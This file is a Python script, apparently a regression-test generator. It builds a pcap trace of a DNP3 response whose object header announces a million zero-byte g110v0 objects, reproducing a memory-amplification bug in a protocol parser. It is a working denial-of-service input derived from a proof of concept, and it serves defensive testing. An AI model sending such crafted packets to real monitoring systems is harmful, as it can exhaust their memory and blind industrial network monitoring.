#!/usr/bin/env python3
"""DNP3 response whose object header announces a huge zero-byte object count.

The outstation sends a single RESPONSE application fragment with one g110v0
object header (object type 0x6E00: octet string of length 0). The qualifier
0x09 selects a 4-byte item count, set to ITEM_COUNT, with no prefix. Because a
g110v0 element occupies zero bytes, binpac's "count <= remaining bytes" guard is
satisfied by ITEM_COUNT bytes of trailing filler. The parser then iterates the
count and, before the fix, retained one Response_Data_Object (~1.7 KB) per
announced element, amplifying a ~1 MB fragment into gigabytes of heap.

The filler is all-zero, so the trace compresses to a few KB; it is committed as
dnp3-response-object-count-amplification.pcap.gz. No network I/O is performed.

Based on the reporter's proof of concept, rewritten with Claude Opus 4.8 to use
Scapy.
"""

import gzip
import struct
from pathlib import Path

from scapy.all import IP, TCP, Ether, Raw, wrpcap

CLIENT = "192.0.2.1"
SERVER = "192.0.2.2"
CLIENT_PORT = 40000
SERVER_PORT = 20000  # DNP3
BASE_TIME = 1_700_000_000.0

MASTER_ADDR = 1
OUTSTATION_ADDR = 1024

# Number of zero-byte objects the response header announces.
ITEM_COUNT = 1_000_000

# A link frame's length field is at most 255: it covers the control and address
# bytes (5) plus up to 250 bytes of user data, i.e. 1 transport byte and 249
# application bytes.
APP_BYTES_PER_FRAME = 249
TCP_SEGMENT_TARGET = 1460


def dnp3_crc(data):
    """Return the 2-byte little-endian DNP3 CRC for a block of bytes."""
    crc = 0
    for value in data:
        crc ^= value
        for _ in range(8):
            crc = (crc >> 1) ^ 0xA6BC if crc & 1 else crc >> 1
    return struct.pack("<H", ~crc & 0xFFFF)


def link_frame(user_data):
    """Wrap transport+application user data in a DNP3 link frame (resp -> req)."""
    header = bytes([0x05, 0x64, 5 + len(user_data), 0x44])
    header += struct.pack("<HH", MASTER_ADDR, OUTSTATION_ADDR)  # dest, src
    out = header + dnp3_crc(header)
    for offset in range(0, len(user_data), 16):
        block = user_data[offset : offset + 16]
        out += block + dnp3_crc(block)
    return out


def dnp3_stream(app_fragment):
    """Fragment one application layer across FIR/FIN transport-tagged frames."""
    chunks = [
        app_fragment[i : i + APP_BYTES_PER_FRAME]
        for i in range(0, len(app_fragment), APP_BYTES_PER_FRAME)
    ]
    out = b""
    for index, chunk in enumerate(chunks):
        transport = index & 0x3F
        if index == 0:
            transport |= 0x40  # FIR: first chunk
        if index == len(chunks) - 1:
            transport |= 0x80  # FIN: last chunk
        out += link_frame(bytes([transport]) + chunk)
    return out


def response_fragment():
    """DNP3 RESPONSE announcing ITEM_COUNT zero-byte g110v0 objects."""
    # app control 0xC0, function code 0x81 RESPONSE, IIN 0x0000, object type
    # 0x6E00 (g110v0: 0-byte octet string), qualifier 0x09 (4-byte count).
    header = b"\xc0\x81\x00\x00\x6e\x00\x09"
    count = struct.pack("<I", ITEM_COUNT)  # range field (byte-swapped -> count)
    return header + count + b"\x00" * ITEM_COUNT  # filler keeps count in bounds


def pkt(is_orig, seq, ack, flags, payload=b""):
    if is_orig:
        src, dst, sport, dport = CLIENT, SERVER, CLIENT_PORT, SERVER_PORT
        eth_src, eth_dst = "02:00:00:00:00:01", "02:00:00:00:00:02"
    else:
        src, dst, sport, dport = SERVER, CLIENT, SERVER_PORT, CLIENT_PORT
        eth_src, eth_dst = "02:00:00:00:00:02", "02:00:00:00:00:01"
    p = (
        Ether(src=eth_src, dst=eth_dst)
        / IP(src=src, dst=dst)
        / TCP(sport=sport, dport=dport, seq=seq, ack=ack, flags=flags)
    )
    if payload:
        p = p / Raw(payload)
    return p


def build_packets():
    client_seq, server_seq = 1000, 2000
    packets = [
        pkt(True, client_seq, 0, "S"),
        pkt(False, server_seq, client_seq + 1, "SA"),
        pkt(True, client_seq + 1, server_seq + 1, "A"),
    ]
    client_seq += 1
    server_seq += 1

    # Outstation (responder) sends the oversized response, packed into segments.
    stream = dnp3_stream(response_fragment())
    for offset in range(0, len(stream), TCP_SEGMENT_TARGET):
        segment = stream[offset : offset + TCP_SEGMENT_TARGET]
        packets.append(pkt(False, server_seq, client_seq, "PA", segment))
        server_seq += len(segment)

    # Client acknowledges the burst, then a clean client-initiated teardown.
    packets.append(pkt(True, client_seq, server_seq, "A"))
    packets.append(pkt(True, client_seq, server_seq, "FA"))
    client_seq += 1
    packets.append(pkt(False, server_seq, client_seq, "FA"))
    server_seq += 1
    packets.append(pkt(True, client_seq, server_seq, "A"))
    return packets


def main():
    packets = build_packets()
    for index, p in enumerate(packets):
        p.time = BASE_TIME + index * 0.001

    with gzip.GzipFile(Path(__file__).with_suffix(".gz"), "wb", mtime=0) as f:
        wrpcap(f, packets)


if __name__ == "__main__":
    main()
